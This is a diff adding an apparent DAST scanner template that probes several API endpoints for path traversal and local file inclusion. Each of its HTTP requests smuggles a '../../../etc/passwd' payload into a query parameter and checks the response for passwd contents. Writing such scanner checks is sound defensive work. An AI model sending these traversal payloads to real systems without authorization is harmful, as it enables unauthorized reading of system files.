@@ -1,0 +1,74 @@
+id: generic-path-traversal
+info:
+  name: Path Traversal / Local File Inclusion
+  author: dast-mvp
+  description: Tests for path traversal vulnerabilities in file handling endpoints
+  severity: critical
+  tags:
+    - path-traversal
+    - lfi
+    - file-handling
+    - generic
+
+http:
+  - raw:
+      - |
+        GET /api/file?path=../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - '/bin/bash'
+          - '/bin/sh'
+        condition: or
+
+  - raw:
+      - |
+        GET /api/file/aws?path=../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - 'ENOENT'
+          - '/etc/passwd'
+        condition: or
+
+  - raw:
+      - |
+        GET /api/download?filename=../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - 'ENOENT'
+        condition: or
+
+  - raw:
+      - |
+        GET /api/hidden-upload?file=../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - 'ENOENT'
+        condition: or
